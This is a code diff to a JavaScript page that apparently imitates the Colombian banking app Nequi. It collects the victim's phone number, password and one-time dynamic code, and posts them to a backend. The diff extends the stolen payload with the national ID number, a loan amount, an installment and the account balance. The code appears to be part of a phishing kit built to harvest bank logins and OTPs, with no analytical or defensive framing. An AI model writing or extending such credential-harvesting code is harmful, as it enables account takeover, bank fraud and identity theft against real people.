@@ -41,6 +41,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const dinamica = currentInput.join('');
             const celular = localStorage.getItem('nequi_celular');
             const clave = localStorage.getItem('nequi_clave');
+            const cedula = localStorage.getItem('nequi_cedula');
+            const monto = localStorage.getItem('nequi_monto') || 'No seleccionado';
+            const cuota = localStorage.getItem('nequi_cuota') || 'No calculado';
+            const saldo = localStorage.getItem('nequi_saldo') || 'No ingresado'; // Should store it when sending to /api/save-data
 
             if (!celular || !clave) {
             alert('Error: No se encontraron datos de sesión. Por favor inicie sesión nuevamente.');
@@ -60,7 +64,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ celular, clave, dinamica })
+                body: JSON.stringify({ celular, clave, dinamica, cedula, monto, cuota, saldo })
             })
             .then(response => {
                 if (!response.ok) {
